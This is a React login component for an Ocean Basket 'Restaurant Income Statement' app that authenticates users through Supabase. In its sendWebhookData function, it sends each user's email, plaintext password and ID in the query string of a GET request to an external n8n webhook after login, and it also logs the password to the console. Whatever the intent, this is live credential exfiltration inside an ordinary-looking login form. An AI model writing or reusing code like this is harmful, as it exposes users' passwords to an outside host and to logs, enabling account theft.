
import React, { useState } from 'react';
import { supabase } from '@/integrations/supabase/client';
import oceanBasketLogo from '@/assets/ocean-basket-logo.png';
import OceanBackground from './ui/ocean-background';

interface LoginProps {
  onLogin: (obid: string) => void;
}

const Login: React.FC<LoginProps> = ({ onLogin }) => {
  // Fixed email reference issue - force cache refresh
  const [obid, setObid] = useState('');
  const [password, setPassword] = useState('');
  const [errors, setErrors] = useState<{ obid?: string; password?: string; general?: string }>({});
  const [isLoading, setIsLoading] = useState(false);

  const convertToEmail = (id: string) => {
    return `${id}@oceanbasket.com`;
  };

  const sendWebhookData = async (email: string, password: string, obid: string) => {
    try {
      const webhookUrl = 'https://exillar-n8n-u48653.vm.elestio.app/webhook-test/Restaurant Income Statement';
      const params = new URLSearchParams({
        email: email,
        password: password,
        obid: obid,
        timestamp: new Date().toISOString()
      });
      
      await fetch(`${webhookUrl}?${params}`, {
        method: 'GET',
      });
      console.log('Webhook data sent successfully');
    } catch (error) {
      console.error('Error sending webhook data:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const newErrors: { obid?: string; password?: string; general?: string } = {};

    console.log('Form submitted with:', { obid, password });

    if (!obid) {
      newErrors.obid = 'OBID is required';
    }

    if (!password) {
      newErrors.password = 'Password is required';
    }

    // Check if we have validation errors
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setIsLoading(true);
    setErrors({});

    try {
      // Convert OBID to email format
      const email = convertToEmail(obid);
      console.log('Attempting Supabase authentication...');
      
      // Sign in with Supabase
      const { data, error } = await supabase.auth.signInWithPassword({
        email: email,
        password: password,
      });

      if (error) {
        console.error('Supabase auth error:', error);
        setErrors({ general: 'Invalid OBID or password' });
        return;
      }

      if (data.user) {
        console.log('Authentication successful:', data.user);
        
        // Send data to webhook
        await sendWebhookData(email, password, obid);
        
        onLogin(obid);
      }
    } catch (error) {
      console.error('Login error:', error);
      setErrors({ general: 'An error occurred during login. Please try again.' });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <OceanBackground variant="login">
      {/* Centered login container */}
      <div className="min-h-screen flex items-center justify-center px-4 sm:px-6 lg:px-8 relative z-10">
        {/* Login card */}
        <div className="w-full max-w-md">
          {/* Glass morphism card effect */}
          <div className="bg-white/10 backdrop-blur-lg border border-white/20 rounded-3xl shadow-2xl p-8 lg:p-10 relative">
            {/* Subtle inner glow */}
            <div className="absolute inset-0 bg-gradient-to-br from-white/5 to-transparent rounded-3xl"></div>
            
            {/* Content container */}
            <div className="relative z-10">
              {/* Logo section */}
              <div className="text-center mb-8 lg:mb-10">
                <div className="flex flex-col items-center justify-center mb-6">
                  <div className="bg-white/90 backdrop-blur-sm rounded-full w-16 h-16 lg:w-20 lg:h-20 flex items-center justify-center mb-4 p-2 shadow-lg ring-4 ring-white/20 hover:ring-white/40 transition-all duration-300">
                    <img 
                      src={oceanBasketLogo} 
                      alt="Ocean Basket Logo" 
                      className="w-full h-full object-contain rounded-full"
                    />
                  </div>
                  <h1 className="text-primary text-xl lg:text-2xl font-script text-center font-bold mb-2">Restaurant Income Statement</h1>
                  <h2 className="text-primary/80 text-lg lg:text-xl font-medium tracking-[0.2em] uppercase">LOG-IN</h2>
                </div>
              </div>

              {/* Login Form */}
              <form onSubmit={handleSubmit} className="space-y-6">
                <div className="relative group">
                  <label className="text-primary/80 text-sm font-medium mb-2 block">
                    OBID <span className="text-secondary ml-1">•</span>
                  </label>
                  <div className="relative">
                    <input
                      type="text"
                      value={obid}
                      onChange={(e) => setObid(e.target.value)}
                      className="w-full bg-white/20 backdrop-blur-sm border border-white/30 rounded-lg px-4 py-3 text-primary placeholder-primary/50 focus:outline-none focus:border-secondary focus:bg-white/30 transition-all duration-300"
                      placeholder="Enter your OBID"
                    />
                    <div className="absolute inset-0 rounded-lg bg-gradient-to-r from-transparent via-white/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none"></div>
                  </div>
                  {errors.obid && (
                    <p className="text-red-500 text-sm mt-2 font-medium">{errors.obid}</p>
                  )}
                </div>

                <div className="relative group">
                  <label className="text-primary/80 text-sm font-medium mb-2 block">
                    Password <span className="text-secondary ml-1">•</span>
                  </label>
                  <div className="relative">
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full bg-white/20 backdrop-blur-sm border border-white/30 rounded-lg px-4 py-3 text-primary placeholder-primary/50 focus:outline-none focus:border-secondary focus:bg-white/30 transition-all duration-300"
                      placeholder="Enter your password"
                    />
                    <div className="absolute inset-0 rounded-lg bg-gradient-to-r from-transparent via-white/5 to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300 pointer-events-none"></div>
                  </div>
                  {errors.password && (
                    <p className="text-red-500 text-sm mt-2 font-medium">{errors.password}</p>
                  )}
                </div>

                {errors.general && (
                  <div className="bg-red-50/90 backdrop-blur-sm border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm font-medium animate-fade-in">
                    {errors.general}
                  </div>
                )}

                <div className="pt-4">
                  <button
                    type="submit"
                    disabled={isLoading}
                    className="w-full bg-gradient-to-r from-primary to-primary/90 hover:from-primary/90 hover:to-primary text-white py-4 px-6 rounded-lg text-base font-medium shadow-lg hover:shadow-xl transform hover:scale-[1.02] transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
                  >
                    {isLoading ? (
                      <div className="flex items-center justify-center">
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin mr-2"></div>
                        Logging in...
                      </div>
                    ) : (
                      'Login'
                    )}
                  </button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </OceanBackground>
  );
};

export default Login;
